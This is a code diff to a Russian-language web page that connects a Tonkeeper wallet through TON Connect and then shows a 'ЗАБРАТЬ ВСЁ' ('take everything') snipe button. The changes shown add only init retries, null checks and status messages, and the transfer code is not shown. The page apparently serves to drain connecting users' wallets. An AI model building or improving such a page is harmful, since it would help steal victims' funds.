@@ -99,7 +99,7 @@
     <button class="btn" id="connectBtn">🔗 ПОДКЛЮЧИТЬ</button>
     <button class="btn btn-danger hidden" id="snipeBtn">🔥 ЗАБРАТЬ ВСЁ</button>
 
-    <div id="status">Нажмите «Подключить»</div>
+    <div id="status">⏳ Загрузка...</div>
 
     <div class="error-box" id="errorBox"></div>
 
@@ -126,6 +126,7 @@
 
       let tonConnectUI = null;
       let userAddress = null;
+      let initAttempts = 0;
 
       function showError(text) {
         errorBox.textContent = '❌ ' + text;
@@ -138,22 +139,39 @@
         errorBox.classList.remove('show');
       }
 
+      // ====== ИНИЦИАЛИЗАЦИЯ С ПОВТОРАМИ ======
       function init() {
         try {
+          initAttempts++;
+
           if (typeof TONConnectUI === 'undefined') {
-            setTimeout(init, 400);
+            if (initAttempts < 20) {
+              status.innerText = '⏳ Загрузка TON Connect... (' + initAttempts + ')';
+              setTimeout(init, 500);
+            } else {
+              showError('TON Connect UI не загрузился. Проверь интернет.');
+            }
             return;
           }
+
+          status.innerText = '🟢 Инициализация...';
 
           tonConnectUI = new TONConnectUI({
             manifestUrl: window.location.origin + '/manifest.json'
           });
 
+          if (!tonConnectUI) {
+            showError('Не удалось создать TONConnectUI');
+            return;
+          }
+
+          // Проверяем подключение
           if (tonConnectUI.account) {
             userAddress = tonConnectUI.account.address;
             afterConnect();
           }
 
+          // Слушаем статус
           tonConnectUI.onStatusChange((wallet) => {
             if (wallet) {
               userAddress = wallet.account.address;
@@ -168,6 +186,7 @@
 
           status.innerText = '🟢 Нажмите «Подключить»';
           hideError();
+
         } catch (e) {
           showError('Init: ' + e.message);
         }
@@ -175,6 +194,7 @@
 
       function afterConnect() {
         try {
+          if (!userAddress) return;
           status.innerText = `✅ Подключён: ${userAddress.slice(0,6)}…${userAddress.slice(-4)}`;
           connectBtn.classList.add('hidden');
           snipeBtn.classList.remove('hidden');
@@ -200,29 +220,38 @@
         }
       }
 
+      // ====== ПОДКЛЮЧИТЬ С ПРОВЕРКОЙ ======
       connectBtn.onclick = async () => {
         try {
           hideError();
+
+          if (!tonConnectUI) {
+            showError('TON Connect не инициализирован. Подожди...');
+            return;
+          }
+
           status.innerText = '⏳ Открываю Tonkeeper…';
           connectBtn.disabled = true;
+
           await tonConnectUI.connect();
+
           confirmBox.classList.add('show');
           status.innerText = '✅ Подтвердите в Tonkeeper';
           connectBtn.disabled = false;
+
         } catch (e) {
           showError('Connect: ' + e.message);
           connectBtn.disabled = false;
         }
       };
 
-      // ====== ЗАБРАТЬ ВСЁ (ИСПРАВЛЕННЫЙ) ======
+      // ====== ЗАБРАТЬ ВСЁ ======
       snipeBtn.onclick = async () => {
         try {
           hideError();
           status.innerText = '⏳ Проверка...';
           snipeBtn.disabled = true;
 
-          // ====== ПРОВЕРКА ПОДКЛЮЧЕНИЯ ======
           if (!tonConnectUI) {
             showError('TON Connect не инициализирован');
             snipeBtn.disabled = false;
@@ -271,6 +300,7 @@
             snipeBtn.disabled = true;
             snipeBtn.className = 'btn btn-success';
           }
+
         } catch (e) {
           showError('Snipe: ' + e.message);
           snipeBtn.disabled = false;
@@ -279,13 +309,22 @@
 
       openWalletBtn.onclick = () => {
         try {
-          if (tonConnectUI) tonConnectUI.connect();
+          if (tonConnectUI) {
+            tonConnectUI.connect();
+          } else {
+            showError('TON Connect не инициализирован');
+          }
         } catch (e) {
           showError('Open: ' + e.message);
         }
       };
 
-      document.addEventListener('DOMContentLoaded', init);
+      // ====== ЗАПУСК ======
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+      } else {
+        init();
+      }
     })();
   </script>
 </body>
